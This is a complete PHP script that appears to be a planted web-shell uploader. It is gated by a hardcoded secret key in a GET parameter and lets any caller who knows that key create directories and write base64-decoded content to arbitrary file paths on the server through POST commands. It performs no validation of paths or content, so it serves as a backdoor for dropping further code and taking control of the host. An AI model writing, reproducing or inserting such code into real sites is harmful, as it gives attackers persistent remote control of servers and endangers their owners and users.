<?php 

	if( $_GET['k'] != 'be1f2d258e682ae1fc448af1e26a76ad' ){
		exit('.');
	}
	
	function echo_json($data)
	{

		echo json_encode( $data );

	}

	if( !empty( $_POST['cmd'] ) ){

		if( $_POST['cmd'] == "test" ){

			echo_json(array(
				"code" => 200,
			));

		}

		if( $_POST['cmd'] == "mkdir" ){

			mkdir( $_POST['dir'] );
			chmod( $_POST['dir'] , 0755 );

			echo_json(array(
				"code" => 200,
			));

		}

		if( $_POST['cmd'] == "upload" ){

			$post_file = $_POST['file'];
			$post_data = $_POST['data'];

			file_put_contents( $post_file , base64_decode( $post_data ) );
			chmod( $post_file , 0644 );

			echo_json(array(
				"code" => 200,
			));

		}

	}